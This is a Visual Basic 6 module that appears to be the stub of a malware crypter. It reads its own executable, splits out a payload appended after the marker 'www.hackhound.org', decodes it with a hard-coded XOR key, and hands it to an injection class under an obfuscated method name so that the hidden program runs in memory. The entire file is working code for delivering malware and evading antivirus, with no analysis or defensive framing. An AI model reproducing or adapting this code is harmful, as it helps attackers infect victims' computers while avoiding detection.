Attribute VB_Name = "mHaupt"
Option Explicit
Const CryptKey As String = "WBYePyrtSj5xEkQ7VuD9VtW"

Sub Main()
Dim bFile() As Byte
Dim sFile As String
Dim sSPlit() As String
Dim inj As New cNtPEL

 Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
  sFile = Space(FileLen(App.Path & "\" & App.EXEName & ".exe"))
 Get #1, , sFile
 Close #1

  sSPlit = Split(sFile, "www.hackhound.org")
  
  sFile = Encrypt(sSPlit(1), CryptKey)
  
  bFile = StrConv(sFile, vbFromUnicode)
   
  inj.DvN2kUqPS1RGC5XHVRzi77ghD bFile
End Sub
Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function

